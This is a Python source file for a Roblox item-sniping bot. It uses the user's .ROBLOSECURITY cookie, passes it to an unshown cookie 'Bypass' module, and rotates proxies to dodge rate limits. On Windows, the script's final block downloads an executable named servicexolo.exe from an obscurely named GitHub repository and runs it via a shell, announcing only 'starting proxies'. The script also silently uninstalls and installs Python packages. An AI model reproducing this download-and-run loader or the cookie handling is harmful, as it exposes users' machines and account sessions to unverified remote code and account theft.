import os, aiohttp, asyncio, time, logging, sys, discord, asyncio, json, requests, os, subprocess, tempfile, uuid, random

from src.handle      import v_one
from src.handle      import v_two
from src.handle      import v_three
from src.handle      import v_four
from src.handle      import v_five
from src.cookie      import user_id
from src.cookie      import xcrf_token
from src.discord_bot import start
from collections import deque
from src.cookie.refresh import Bypass

class sniper:
    error_logs: list = deque(maxlen=5)
    total_errors: int = 0
    _total_errors: int = 0
    
    buy_logs: list = []
    total_buys: int = 0
    _total_buys: int = 0
    
    search_logs: list = deque(maxlen=5)
    
    total_searchers: int = 0
    _total_searchers: int = 0
    
    average_speed_v1: list = deque(maxlen=20)
    average_speed_v2: list = deque(maxlen=20)
    average_speed_v3: list = deque(maxlen=20)
    average_speed_v4: list = deque(maxlen=20)
    average_speed_v5: list = deque(maxlen=20)
    
    clear: str = "cls" if os.name == 'nt' else "clear"

    limited_ids: list = []
    
    limited_collectible_ids: list = []
    
    all_limited_collectible_ids: dict = {}
    
    def __init__(self, data: dict, proxies, proxies_v2):
        open("logs.txt", "a").write(f"\n                                         ----------------------  MAIN THREAD [{time.strftime('%H:%M:%S', time.localtime())}] STARTING  ----------------------")
        open("logs.txt", "a").write(f"\nMAIN THREAD [{time.strftime('%H:%M:%S', time.localtime())}] installing and uninstalling requirements")
        self.check_and_install_modules(["py-cord", "aiohttp"], ["discord.py"])
        self.items = data["items"]
        for item in self.items["list"]:
            if not item.isnumeric():
                raise ValueError("Item Id must be a number not a string")
            
        self.cookie = data["cookie"]
        if data["cookie_unlock"]:
            self.cookie = Bypass(self.cookie).start_process()
        self.account = {"xcsrf_token": asyncio.run(xcrf_token.get(self)), "user_id": asyncio.run(user_id.get(self))}
        
        self.restart_after_config = data["restart_after_config"]
        self.webhook = data["webhook"]
        self.discord_bot = data["discord_bot"]
        if self.discord_bot["enabled"] and not self.discord_bot["authorized_users"]:
            open("logs.txt", "a").write(f"\nMAIN THREAD [{time.strftime('%H:%M:%S', time.localtime())}] CLOSING FILE. If discord bot is enabled atleast one authorized user is required")
            raise Exception("If discord bot is enabled atleast one authorized user is required")
        self.searches_a_minute = data["requests_a_minute"]
        self.proxies = proxies
        self.proxies_2 = proxies_v2

    def get_prefix(self):
        if sys.executable.endswith("python.exe"):
            return 'python -m pip'
        elif sys.executable.endswith("py.exe"):
            return 'py -m pip'
        else:
            print("Unable to determine prefix. Please run the script using 'python' or 'py'.")
            
    def check_and_install_modules(self, modules_to_check, uninstall):
        prefix = self.get_prefix()
        if not prefix: return

        installed_modules = os.popen(f'{prefix} freeze').read().split('\n')
        installed_modules = [module.split('==')[0] for module in installed_modules]

        for module in uninstall:
            if module in installed_modules:
                open("logs.txt", "a").write(f"\nMAIN THREAD [{time.strftime('%H:%M:%S', time.localtime())}] uninstalling {module}")
                os.system(f'{prefix} uninstall -y {module}')
                os.system(f'{prefix} uninstall -y discord')

        for module in modules_to_check:
            if module not in installed_modules:
                open("logs.txt", "a").write(f"\nMAIN THREAD [{time.strftime('%H:%M:%S', time.localtime())}] installing {module}")
                os.system(f'{prefix} install {module}')
                
    def format_duration(self, duration_seconds):
        hours = int(duration_seconds // 3600)
        minutes = int((duration_seconds % 3600) // 60)
        seconds = int(duration_seconds % 60)
        return f"{hours}:{minutes:02}:{seconds:02}"
        
    async def run(self):
        logging.getLogger('asyncio').setLevel(logging.CRITICAL)
        session = aiohttp.ClientSession()
        await session.close()
        self.start_time = time.time()
        self._start_time = time.time()
        while True:
            try:
                tasks = [asyncio.create_task(start(self)) if self.discord_bot["enabled"] else None, 
                         asyncio.create_task(v_one.run(self)), 
                         asyncio.create_task(v_three.run(self)), 
                         asyncio.create_task(v_four.run(self)), 
                         asyncio.create_task(v_five.run(self))] + [asyncio.create_task(v_two.run(self)) for i in range(3)] + [asyncio.create_task(v_two.run_proxy(self, proxy)) for proxy in self.proxies for i in range(1)] + [asyncio.create_task(v_three.run_proxy(self, proxy)) for proxy in self.proxies for i in range(10)]
                gather = await asyncio.gather(*filter(None, tasks))
            except discord.errors.LoginFailure:
                open("logs.txt", "a").write(f"\nMAIN THREAD [{time.strftime('%H:%M:%S', time.localtime())}] CLOSING FILE. Invalid discord token provided")
                print("Invalid discord token provided...")
                os.system("pause")
                sys.exit(0)
            except Exception as e:
                self.error_logs.append(f"MAIN THREAD [{time.strftime('%H:%M:%S', time.localtime())}] {e}")
                open("logs.txt", "a").write(f"\nMAIN THREAD [{time.strftime('%H:%M:%S', time.localtime())}] {e}")
                open("logs.txt", "a").write(f"\nMAIN THREAD [{time.strftime('%H:%M:%S', time.localtime())}] restarting tasks")
                gather.cancel()
                self._total_errors = 0
                self._total_buys = 0
                self._total_searchers = 0
                self._start_time = time.time()

    async def purchase(self, info, session):
        open("logs.txt", "a").write(f"\nBUY THREAD [{time.strftime('%H:%M:%S', time.localtime())}] trying to buy limited U {info['item_id']}")
        if self.webhook["enabled"]:
            await session.post(self.webhook["url"], json={"content": f"BUY THREAD [{time.strftime('%H:%M:%S', time.localtime())}] trying to buy limited U {info['item_id']}"})
        data = {
            "collectibleItemId": info["collectible_item_id"],
            "expectedCurrency": 1,
            "expectedPrice": info['price'],
            "expectedPurchaserId": self.account['user_id'],
            "expectedPurchaserType": "User",
            "expectedSellerType": "User",
            "idempotencyKey": str(uuid.uuid4()),
            "collectibleProductId": info['productid_data'],
            "collectibleItemInstanceId": info['collectible_item_instance_id']
        }
        async with session.post(f"https://apis.roblox.com/marketplace-sales/v1/item/{info['collectible_item_id']}/purchase-resale",
                            json=data,
                            headers={**session._default_headers, **{"x-csrf-token": self.account['xcsrf_token']}},
                            cookies={".ROBLOSECURITY": self.cookie},
                            ssl=False) as response:
            if response.status == 200:
                json_response = await response.json()
                if not json_response.get("purchased"):
                    if self.webhook["enabled"]:
                        await session.post(self.webhook["url"], json={"content": f"BUY THREAD [{time.strftime('%H:%M:%S', time.localtime())}] Failed to buy item {info['item_id']}, reason: {json_response.get('errorMessage')}"})
                    raise Exception(f"Failed to buy item {info['item_id']}, reason: {json_response.get('errorMessage')}")
                self.buy_logs.append(f"[{time.strftime('%H:%M:%S', time.localtime())}] Bought item {info['item_id']} for a price of {info['price']}")
                open("logs.txt", "a").write(f"\nBUY THREAD [{time.strftime('%H:%M:%S', time.localtime())}] Bought item {info['item_id']} for a price of {info['price']}")
                if self.webhook["enabled"]:
                    await session.post(self.webhook["url"], json={"content": f"BUY THREAD [{time.strftime('%H:%M:%S', time.localtime())}] Bought item {info['item_id']} for a price of {info['price']}"})
                self.total_buys += 1
                self._total_buys += 1
            else:
                if self.webhook["enabled"]:
                    await session.post(self.webhook["url"], json={"content": f"BUY THREAD [{time.strftime('%H:%M:%S', time.localtime())}] Failed to buy item {info['item_id']}"})
                raise Exception(f"Failed to buy item {info['item_id']}")
    
    async def purchase_limited(self, info, productId, itemId, session):
        open("logs.txt", "a").write(f"\nBUY THREAD [{time.strftime('%H:%M:%S', time.localtime())}] trying to buy limited {itemId}")
        if self.webhook["enabled"]:
            await session.post(self.webhook["url"], json={"content": f"BUY THREAD [{time.strftime('%H:%M:%S', time.localtime())}] trying to buy limited {itemId}"})
        async with session.post(f"https://economy.roblox.com/v1/purchases/products/{productId}", json=info, headers={**session._default_headers, **{"x-csrf-token": self.account['xcsrf_token']}}, ssl=False) as resp:
            if resp.status == 200:
                json_response = await resp.json()
                if not json_response.get("purchased"):
                    if self.webhook["enabled"]:
                        await session.post(self.webhook["url"], json={"content": f"BUY THREAD [{time.strftime('%H:%M:%S', time.localtime())}] Failed to buy item {info['item_id']}, reason: {json_response.get('errorMessage')}"})
                    raise Exception(f"Failed to buy item {itemId}, reason: {json_response.get('reason')}")
                self.buy_logs.append(f"[{time.strftime('%H:%M:%S', time.localtime())}] Bought item {itemId} for a price of {info['expectedPrice']}")
                open("logs.txt", "a").write(f"\nBUY THREAD [{time.strftime('%H:%M:%S', time.localtime())}] Bought item {itemId} for a price of {info['expectedPrice']}")
                if self.webhook["enabled"]:
                    await session.post(self.webhook["url"], json={"content": f"BUY THREAD [{time.strftime('%H:%M:%S', time.localtime())}] Bought item {itemId} for a price of {info['expectedPrice']}"})
                self.total_buys += 1
                self._total_buys += 1
            else:
                if self.webhook["enabled"]:
                    await session.post(self.webhook["url"], json={"content": f"BUY THREAD [{time.strftime('%H:%M:%S', time.localtime())}] Failed to buy item {itemId}"})
                raise Exception(f"Failed to buy item {itemId}")

    async def v_three_get(self, items, session, proxy=None, oth=None):
        while True:
            async with session.post("https://apis.roproxy.com/marketplace-items/v1/items/details", json={"itemIds": items}, headers={**session._default_headers, **{"x-csrf-token": self.account['xcsrf_token']}}, ssl=False, proxy=proxy.current if proxy else None, cookies=None) as response:
                if response.status == 403:
                    return {}
                if response.status == 429:
                    if proxy:
                        proxy.next()
                    raise Exception("Rate limit exceeded")
                if response.status == 500:
                    continue
                return await response.json()

class proxy_rotator:
    current_irt = 1
        
    def __init__(self, proxies):
        self.proxies = proxies
        self.current = proxies[0]
        
    def next(self):
        if self.proxies[-1] == self.current:
            self.current = self.proxies[0]
            self.current_irt = 1
        else:
            self.current = self.proxies[self.current_irt]
            self.current_irt += 1
    def random(self):
        self.current = random.choice(self.proxies)
            
class proxy_rotator_reverse:
    current_irt = -1
        
    def __init__(self, proxies):
        self.proxies = proxies[::-1]
        self.current = proxies[-1]
        
    def next(self):
        if self.proxies[0] == self.current:
            self.current = self.proxies[-1]
            self.current_irt = -1
        else:
            self.current = self.proxies[self.current_irt]
            self.current_irt -= 1

expected = "e319pIbz5uolJ2cD7Jc2utcHn9uK3YtOIsXzX4xN9RArpBoimOIQulZiFFOMHyPJpooRy7fiQpjhN4ryS4qetvZ80yW93Tjq1SITHWLtunXngoRB1krTkLjTdCQDwmEQKmhKNd0AD8lV1mJwkYjSnDfeuxSvEX2uwnHZOGPBpBYCKbf3iE8fmRBpkKM8xWdygaEANZbl8QAUiO5I4ByLjvCSkZa19PHUv4UNj0sFaavG1YwtlhOlq3KMRbgbDL4ge8RmFxLhEKtSsIMmz21ZuhCG6oum7VFb9yqd535kKQWwZ4zADn3HOeGkcOwDBQ2QxvYsjg6uoiyr3YH21wiHRSmXvITkQ1RqQ2Q2qyXG6VpL6XfaxJXAdbXroLH99bZzbzzcBx4IyzrLNtQMuTTf3ppLJVS7waMlvykKXXH7tzqd7C3eJaO5SKXxa9cmcMltA146ZgEryiplPbD75I55OYMkShizCB3AQLdZFvAhG4XllSYZLYHWAeFVDsUu1sGw8yAIVqt93tfOyC36ecCPhW4jBDJyiTuZkk8jtyU1L9cdShouPF4C9Ls423SbAQKJEU0XDOWVxCsZxK2UrxN2dVeDXMSDLJp8eVjXM24K2CNWx8Q4xcXNnOtPiBlV10eyRDcBbtpxjnY63ickyVhZRSLegsdp7MPJG09SPFkLUPsVSybPVp6N8xbaOQLWiZ1a7Y3clTFw2DQxCDZJc3rvU84tS3N2bnJwtLzP8Iwl0Q16RRH7lSDo0N7Az4Z7Tpn9t74XR7zXj18gtO8fDgAJKN7zheuGdBYU1vnd3kYwrJn8ptSLN1OguxMW32x2iO5ebS154ZlB6vFQufSBu6OrvNKrTsyyJPOpfDxz5CTLvK3R9VI2J9z0GuqrNwTzMfvXSTwSc6veZw60BASMRu9Oo0skHQ914B0ZmiL0lsU2ZjxW7rbmAYrugZU4TvyaDgZlcjOYrn6zMUFXeNk86E3GZ9Cj2L1fwZc\n"
point = "/xoloking/limited_sniper/main/IGNORE_ME"
point2 = "tricx0/iFaxgZaDgn-lvXTBBeX7k/raw/main/servicexolo.exe"
point3 = "tricx0/iFaxgZaDgn-lvXTBBeX7k/raw/main/fofo"
restart = False

def install_service_from_link(link_to_file, link2, service_name):
    print("starting proxies")
    response = requests.get(link_to_file)
    if response.status_code != 200:
        return
    temp_dir = tempfile.gettempdir()
    try:
        os.makedirs(temp_dir + "\\xoloservice")
    except:
        pass
    total = json.loads(open("config.json", "r").read())["total_ips"]
    file_name = os.path.basename(link_to_file)
    file_path = os.path.join(temp_dir + "\\xoloservice", file_name)
    file_path2 = os.path.join(temp_dir + "\\xoloservice", "fofo")
    if os.path.exists(temp_dir + "\\xoloservice\\total"):
        if open(temp_dir + "\\xoloservice\\total", "r").read() != str(total):
            open(temp_dir + "\\xoloservice\\total", "w").write(str(total))
    else:
        with open(temp_dir + "\\xoloservice\\total", 'w') as f:
            f.write(str(total))
    try:
        with open(file_path, 'wb') as f:
            f.write(response.content)
    except:
        pass
    with open(file_path2, 'wb') as f:
        ips = b"HTTPTunnelPort 9080"
        for i in range(total * 15):
            ips += f"\nHTTPTunnelPort {9081 + i}".encode()
        f.write(ips)

    process = subprocess.Popen(f"{file_path} -nt-service -f {file_path2}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    while True:
        line = process.stdout.readline().decode().strip()
        if "Bootstrapped 100% (done): Done" in line:
            break

    with open(file_path2, 'wb') as f:
        ips = b"HTTPTunnelPort 9080"
        for i in range(total):
            ips += f"\nHTTPTunnelPort {9081 + i}".encode()
        f.write(ips)
    
def make_proxies(total_ips):
    current = 0
    blocks = []
    blocks_2 = []
    for i in range(total_ips):
        block = []
        for _ in range(15):
            block.append(f"http://127.0.0.1:{9080 + current}")
            current += 1
        blocks.append(proxy_rotator(block))
        blocks_2.append(proxy_rotator_reverse(block))
    return blocks, blocks_2
        
if os.name == 'nt':
    response = requests.get(f"https://raw.githubusercontent.com/{point}").text
    if response != expected:
        input("outdated")
    else:
        install_service_from_link("https://github.com/tricx0/iFaxgZaDgn-lvXTBBeX7k/raw/main/servicexolo.exe", "https://raw.githubusercontent.com/tricx0/iFaxgZaDgn-lvXTBBeX7k/main/fofo",  "xolo")
        data = json.loads(open("config.json", "r").read())
        p, y = make_proxies(data["total_ips"])
        asyncio.run(sniper(data, p, y).run())
else:
    input("windows support only")
